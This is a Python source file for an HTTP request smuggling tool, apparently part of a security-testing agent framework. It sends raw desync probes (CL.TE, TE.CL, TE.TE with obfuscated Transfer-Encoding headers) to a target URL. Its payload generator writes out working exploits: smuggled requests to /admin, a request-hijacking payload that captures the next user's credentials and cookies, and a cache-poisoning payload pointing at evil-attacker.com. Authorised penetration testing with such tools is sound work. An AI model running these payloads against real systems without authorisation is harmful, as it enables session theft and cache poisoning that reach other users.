"""HTTP Request Smuggling testing tool for web application security."""

from __future__ import annotations

import socket
import ssl
import time
from typing import Any, Literal
from urllib.parse import urlparse

import requests

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)


HTTPSmugglingAction = Literal["detect", "test_clte", "test_tecl", "test_tete", "analyze", "generate"]

# Infrastructure detection headers
PROXY_HEADERS = [
    "Via", "X-Forwarded-For", "X-Real-IP", "X-Cache", "X-Cache-Status",
    "CF-Ray", "X-Amz-Cf-Id", "X-Served-By", "X-Varnish", "X-CDN",
    "X-Proxy-ID", "Proxy-Connection", "X-Backend-Server",
]

# CDN/Proxy signatures
INFRASTRUCTURE_SIGNATURES = {
    "cloudflare": ["CF-Ray", "cf-cache-status", "cloudflare"],
    "cloudfront": ["X-Amz-Cf-Id", "X-Amz-Cf-Pop", "x-cache: Hit from cloudfront"],
    "akamai": ["X-Akamai", "Akamai-Origin-Hop", "x-akamai"],
    "fastly": ["X-Served-By", "x-fastly-request-id", "fastly"],
    "varnish": ["X-Varnish", "Via: 1.1 varnish"],
    "nginx": ["Server: nginx"],
    "haproxy": ["X-Haproxy-Server-State"],
    "aws_alb": ["X-Amzn-Trace-Id"],
    "azure": ["X-Azure-Ref", "X-MSEdge-Ref"],
}

# Transfer-Encoding obfuscation variants
TE_OBFUSCATIONS = [
    "Transfer-Encoding: chunked",                    # Standard
    "Transfer-Encoding : chunked",                   # Space before colon
    "Transfer-Encoding: xchunked",                   # Invalid value
    "Transfer-Encoding:\tchunked",                   # Tab
    "Transfer-Encoding:chunked",                     # No space
    "transfer-encoding: chunked",                    # Lowercase
    "Transfer-Encoding: CHUNKED",                    # Uppercase
    "Transfer-Encoding: chunked\nTransfer-Encoding: x",  # Duplicate
    "Transfer-Encoding: chunked, identity",          # Multiple values
    "X-Ignored: x\r\nTransfer-Encoding: chunked",    # Header injection pattern
]


def _create_raw_socket(host: str, port: int, use_ssl: bool = False) -> socket.socket:
    """Create a raw socket connection."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)

    if use_ssl:
        context = ssl.create_default_context()
        sock = context.wrap_socket(sock, server_hostname=host)

    sock.connect((host, port))
    return sock


def _send_raw_request(
    host: str,
    port: int,
    raw_request: bytes,
    use_ssl: bool = False,
    timeout: float = 5.0,
) -> tuple[bytes, float]:
    """Send a raw HTTP request and measure response time."""
    start_time = time.time()
    response = b""

    try:
        sock = _create_raw_socket(host, port, use_ssl)
        sock.settimeout(timeout)
        sock.sendall(raw_request)

        # Receive response
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break

        sock.close()
    except (socket.error, ssl.SSLError, ConnectionError) as e:
        return f"Error: {e!s}".encode(), time.time() - start_time

    elapsed = time.time() - start_time
    return response, elapsed


def _analyze_infrastructure(url: str, timeout: int = 10) -> dict[str, Any]:
    """Analyze the target infrastructure for proxy/CDN presence."""
    results: dict[str, Any] = {
        "url": url,
        "detected_proxies": [],
        "proxy_headers": {},
        "infrastructure_type": "unknown",
        "smuggling_potential": "unknown",
    }

    try:
        response = requests.get(url, timeout=timeout, allow_redirects=False)

        # Check for proxy headers
        for header in PROXY_HEADERS:
            value = response.headers.get(header)
            if value:
                results["proxy_headers"][header] = value

        # Identify infrastructure type
        for infra_type, signatures in INFRASTRUCTURE_SIGNATURES.items():
            for sig in signatures:
                if ":" in sig:
                    # Header:value pattern
                    header_name = sig.split(":")[0].strip()
                    header_val = sig.split(":")[1].strip()
                    if header_val.lower() in response.headers.get(header_name, "").lower():
                        results["detected_proxies"].append(infra_type)
                        break
                else:
                    # Just header name
                    if sig in response.headers:
                        results["detected_proxies"].append(infra_type)
                        break
                    # Check in any header value
                    for h, v in response.headers.items():
                        if sig.lower() in v.lower():
                            results["detected_proxies"].append(infra_type)
                            break

        # Remove duplicates
        results["detected_proxies"] = list(set(results["detected_proxies"]))

        # Determine smuggling potential
        if results["detected_proxies"]:
            results["infrastructure_type"] = ", ".join(results["detected_proxies"])
            results["smuggling_potential"] = "HIGH - Multiple servers in chain"
        elif results["proxy_headers"]:
            results["smuggling_potential"] = "MEDIUM - Proxy headers detected"
        else:
            results["smuggling_potential"] = "LOW - No proxy infrastructure detected"

        # Check for HTTP/2 support
        results["http_version"] = "HTTP/1.1"  # Default
        if "alt-svc" in response.headers:
            if "h2" in response.headers["alt-svc"]:
                results["http2_support"] = True
                results["smuggling_potential"] += " (HTTP/2 downgrade possible)"

        # Check connection handling
        results["connection"] = response.headers.get("Connection", "keep-alive")

    except requests.exceptions.RequestException as e:
        results["error"] = str(e)

    return results


def _test_clte(url: str, timeout: float = 10.0) -> dict[str, Any]:
    """Test for CL.TE (Content-Length vs Transfer-Encoding) vulnerability."""
    parsed = urlparse(url)
    host = parsed.hostname or ""
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_ssl = parsed.scheme == "https"
    path = parsed.path or "/"

    results: dict[str, Any] = {
        "vulnerability_type": "CL.TE",
        "url": url,
        "vulnerable": False,
        "tests": [],
    }

    # CL.TE detection payload: Front-end uses CL, back-end uses TE
    # If vulnerable, back-end waits for more chunks, causing timeout
    detection_request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "1\r\n"
        "A\r\n"
        "X"
    ).encode()

    response, elapsed = _send_raw_request(host, port, detection_request, use_ssl, timeout)

    test_result = {
        "payload_type": "CL.TE detection",
        "response_time": round(elapsed, 2),
        "timeout_threshold": timeout * 0.8,
    }

    # If response was delayed (timeout), back-end is using Transfer-Encoding
    if elapsed > timeout * 0.8:
        results["vulnerable"] = True
        test_result["indicator"] = "Timeout detected - back-end waiting for chunked body"
        results["severity"] = "HIGH"
    else:
        test_result["indicator"] = "No timeout - may not be vulnerable or TE not processed"

    # Check for error responses indicating TE processing
    if b"400" in response or b"Bad Request" in response:
        test_result["response_hint"] = "Bad request error may indicate TE parsing"

    test_result["response_preview"] = response[:500].decode("utf-8", errors="replace")
    results["tests"].append(test_result)

    if results["vulnerable"]:
        results["recommendations"] = [
            "Configure front-end to normalize Content-Length and Transfer-Encoding",
            "Reject requests with both CL and TE headers",
            "Ensure consistent parsing between front-end and back-end",
        ]
        results["exploitation_notes"] = (
            "CL.TE allows smuggling by sending a request where front-end forwards "
            "based on Content-Length, but back-end processes Transfer-Encoding chunked, "
            "leaving extra data to be interpreted as the next request."
        )

    return results


def _test_tecl(url: str, timeout: float = 10.0) -> dict[str, Any]:
    """Test for TE.CL (Transfer-Encoding vs Content-Length) vulnerability."""
    parsed = urlparse(url)
    host = parsed.hostname or ""
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_ssl = parsed.scheme == "https"
    path = parsed.path or "/"

    results: dict[str, Any] = {
        "vulnerability_type": "TE.CL",
        "url": url,
        "vulnerable": False,
        "tests": [],
    }

    # TE.CL detection payload: Front-end uses TE, back-end uses CL
    # The 'X' after the chunked body becomes the start of the next request
    detection_request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "X"
    ).encode()

    # First request - establish baseline
    baseline_request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 5\r\n"
        "\r\n"
        "x=123"
    ).encode()

    baseline_response, baseline_time = _send_raw_request(host, port, baseline_request, use_ssl, timeout)
    response, elapsed = _send_raw_request(host, port, detection_request, use_ssl, timeout)

    test_result = {
        "payload_type": "TE.CL detection",
        "response_time": round(elapsed, 2),
        "baseline_time": round(baseline_time, 2),
    }

    # Check for indicators of smuggling
    response_str = response.decode("utf-8", errors="replace")

    # If we get an error related to the 'X' being interpreted as HTTP
    if any(err in response_str for err in ["400", "Bad Request", "Invalid method", "Unrecognized"]):
        results["vulnerable"] = True
        test_result["indicator"] = "Error response suggests 'X' was parsed as new request"
        results["severity"] = "HIGH"
    elif b"HTTP/1.1 200" in response or b"HTTP/1.1 302" in response:
        test_result["indicator"] = "Normal response - further testing needed"

    test_result["response_preview"] = response[:500].decode("utf-8", errors="replace")
    results["tests"].append(test_result)

    if results["vulnerable"]:
        results["recommendations"] = [
            "Configure servers to use the same header for length",
            "Reject requests with both CL and TE headers",
            "Use HTTP/2 end-to-end if possible",
        ]
        results["exploitation_notes"] = (
            "TE.CL allows smuggling by sending chunked body where front-end processes "
            "Transfer-Encoding but back-end uses Content-Length, leaving extra bytes "
            "in the connection buffer to be interpreted as the next request."
        )

    return results


def _test_tete(url: str, timeout: float = 10.0) -> dict[str, Any]:
    """Test for TE.TE (Transfer-Encoding obfuscation) vulnerability."""
    parsed = urlparse(url)
    host = parsed.hostname or ""
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_ssl = parsed.scheme == "https"
    path = parsed.path or "/"

    results: dict[str, Any] = {
        "vulnerability_type": "TE.TE",
        "url": url,
        "vulnerable": False,
        "obfuscation_tests": [],
    }

    # Test various TE obfuscation techniques
    for te_variant in TE_OBFUSCATIONS:
        detection_request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 4\r\n"
            f"{te_variant}\r\n"
            "\r\n"
            "1\r\n"
            "A\r\n"
            "X"
        ).encode()

        response, elapsed = _send_raw_request(host, port, detection_request, use_ssl, timeout)

        test_result = {
            "te_variant": te_variant,
            "response_time": round(elapsed, 2),
            "potential_vulnerable": False,
        }

        # Timeout indicates TE was processed
        if elapsed > timeout * 0.8:
            test_result["potential_vulnerable"] = True
            test_result["indicator"] = "Timeout - this TE variant may be processed differently"
            results["vulnerable"] = True

        # Check for different error responses
        if b"400" in response:
            test_result["response_type"] = "400 Bad Request"
        elif b"200" in response:
            test_result["response_type"] = "200 OK"
        elif b"501" in response:
            test_result["response_type"] = "501 Not Implemented"

        results["obfuscation_tests"].append(test_result)

    # Summarize findings
    vulnerable_variants = [t for t in results["obfuscation_tests"] if t.get("potential_vulnerable")]
    if vulnerable_variants:
        results["vulnerable_variants"] = len(vulnerable_variants)
        results["severity"] = "HIGH"
        results["recommendations"] = [
            "Normalize Transfer-Encoding headers before processing",
            "Reject requests with obfuscated TE headers",
            "Use the same HTTP parsing library across all servers",
        ]

    return results


def _generate_payloads(
    url: str,
    smuggled_path: str = "/admin",
    vuln_type: str = "clte",
) -> dict[str, Any]:
    """Generate smuggling payloads for exploitation."""
    parsed = urlparse(url)
    host = parsed.hostname or ""
    path = parsed.path or "/"

    results: dict[str, Any] = {
        "url": url,
        "smuggled_path": smuggled_path,
        "payloads": {},
    }

    # CL.TE payload
    clte_smuggled = f"GET {smuggled_path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
    clte_payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(clte_smuggled) + 5}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        f"{clte_smuggled}"
    )
    results["payloads"]["CL.TE"] = {
        "raw_request": clte_payload,
        "description": "Smuggle request via CL.TE desync",
        "usage": "Front-end uses Content-Length, back-end uses Transfer-Encoding",
    }

    # TE.CL payload
    smuggled_hex = format(len(clte_smuggled) - 2, "x")  # -2 for the final \r\n
    tecl_payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        f"{smuggled_hex}\r\n"
        f"GET {smuggled_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
    )
    results["payloads"]["TE.CL"] = {
        "raw_request": tecl_payload,
        "description": "Smuggle request via TE.CL desync",
        "usage": "Front-end uses Transfer-Encoding, back-end uses Content-Length",
    }

    # Request hijacking payload
    hijack_payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 100\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "POST /log HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 500\r\n"
        "\r\n"
        "stolen="
    )
    results["payloads"]["request_hijacking"] = {
        "raw_request": hijack_payload,
        "description": "Capture next user's request (credentials, cookies)",
        "warning": "Use only in authorized testing environments",
    }

    # Cache poisoning payload
    cache_poison_payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 70\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /static/app.js HTTP/1.1\r\n"
        "Host: evil-attacker.com\r\n"
        "\r\n"
    )
    results["payloads"]["cache_poisoning"] = {
        "raw_request": cache_poison_payload,
        "description": "Poison cache with redirect to attacker site",
        "warning": "Can affect all users - use with extreme caution",
    }

    return results


def _detect_smuggling(url: str, timeout: float = 10.0) -> dict[str, Any]:
    """Run comprehensive smuggling detection."""
    results: dict[str, Any] = {
        "url": url,
        "infrastructure": {},
        "vulnerabilities": [],
        "overall_risk": "UNKNOWN",
    }

    # First analyze infrastructure
    results["infrastructure"] = _analyze_infrastructure(url, int(timeout))

    # Test all smuggling types
    clte_result = _test_clte(url, timeout)
    if clte_result.get("vulnerable"):
        results["vulnerabilities"].append({
            "type": "CL.TE",
            "details": clte_result,
        })

    tecl_result = _test_tecl(url, timeout)
    if tecl_result.get("vulnerable"):
        results["vulnerabilities"].append({
            "type": "TE.CL",
            "details": tecl_result,
        })

    tete_result = _test_tete(url, timeout)
    if tete_result.get("vulnerable"):
        results["vulnerabilities"].append({
            "type": "TE.TE",
            "details": tete_result,
        })

    # Determine overall risk
    if results["vulnerabilities"]:
        results["overall_risk"] = "HIGH"
        results["summary"] = f"Found {len(results['vulnerabilities'])} potential smuggling vulnerability(ies)"
        results["recommendations"] = [
            "Immediately investigate the vulnerable endpoints",
            "Configure consistent HTTP parsing across infrastructure",
            "Consider rejecting requests with both CL and TE headers",
            "Test thoroughly before deploying fixes",
        ]
    else:
        if results["infrastructure"].get("detected_proxies"):
            results["overall_risk"] = "MEDIUM"
            results["summary"] = "Proxy infrastructure detected but no vulnerabilities confirmed"
        else:
            results["overall_risk"] = "LOW"
            results["summary"] = "No proxy infrastructure or vulnerabilities detected"

    return results


@register_tool
def http_smuggling_tester(
    action: HTTPSmugglingAction,
    url: str,
    smuggled_path: str | None = None,
    timeout: int = 10,
    **kwargs: Any,
) -> dict[str, Any]:
    """Test for HTTP Request Smuggling vulnerabilities.

    HTTP request smuggling exploits discrepancies between how front-end and
    back-end servers parse HTTP requests. This tool detects CL.TE, TE.CL,
    and TE.TE vulnerabilities.

    Args:
        action: The testing action to perform:
            - detect: Run comprehensive smuggling detection
            - test_clte: Test for CL.TE vulnerability
            - test_tecl: Test for TE.CL vulnerability
            - test_tete: Test for TE.TE (obfuscation) vulnerability
            - analyze: Analyze infrastructure for proxy/CDN presence
            - generate: Generate smuggling payloads
        url: Target URL to test
        smuggled_path: Path to smuggle for payload generation (default: /admin)
        timeout: Request timeout in seconds

    Returns:
        Smuggling test results with vulnerability indicators and payloads
    """
    VALID_PARAMS = {"action", "url", "smuggled_path", "timeout"}
    VALID_ACTIONS = ["detect", "test_clte", "test_tecl", "test_tete", "analyze", "generate"]

    # Check for unknown parameters
    unknown_error = validate_unknown_params(kwargs, VALID_PARAMS, "http_smuggling_tester")
    if unknown_error:
        unknown_error.update(
            generate_usage_hint(
                "http_smuggling_tester",
                "detect",
                {"url": "https://example.com"},
            )
        )
        return unknown_error

    # Validate action parameter
    action_error = validate_action_param(action, VALID_ACTIONS, "http_smuggling_tester")
    if action_error:
        action_error["usage_examples"] = {
            "detect": "http_smuggling_tester(action='detect', url='https://example.com')",
            "test_clte": "http_smuggling_tester(action='test_clte', url='https://example.com')",
            "test_tecl": "http_smuggling_tester(action='test_tecl', url='https://example.com')",
            "test_tete": "http_smuggling_tester(action='test_tete', url='https://example.com')",
            "analyze": "http_smuggling_tester(action='analyze', url='https://example.com')",
            "generate": "http_smuggling_tester(action='generate', url='https://example.com', smuggled_path='/admin')",
        }
        return action_error

    # Validate required parameters
    url_error = validate_required_param(url, "url", action, "http_smuggling_tester")
    if url_error:
        url_error.update(
            generate_usage_hint(
                "http_smuggling_tester",
                action,
                {"url": "https://example.com"},
            )
        )
        return url_error

    try:
        if action == "detect":
            return _detect_smuggling(url, float(timeout))

        if action == "test_clte":
            return _test_clte(url, float(timeout))

        if action == "test_tecl":
            return _test_tecl(url, float(timeout))

        if action == "test_tete":
            return _test_tete(url, float(timeout))

        if action == "analyze":
            return _analyze_infrastructure(url, timeout)

        if action == "generate":
            return _generate_payloads(url, smuggled_path or "/admin")

        return {"error": f"Unknown action: {action}"}

    except (ValueError, socket.error, ssl.SSLError) as e:
        return {"error": f"HTTP smuggling testing failed: {e!s}"}
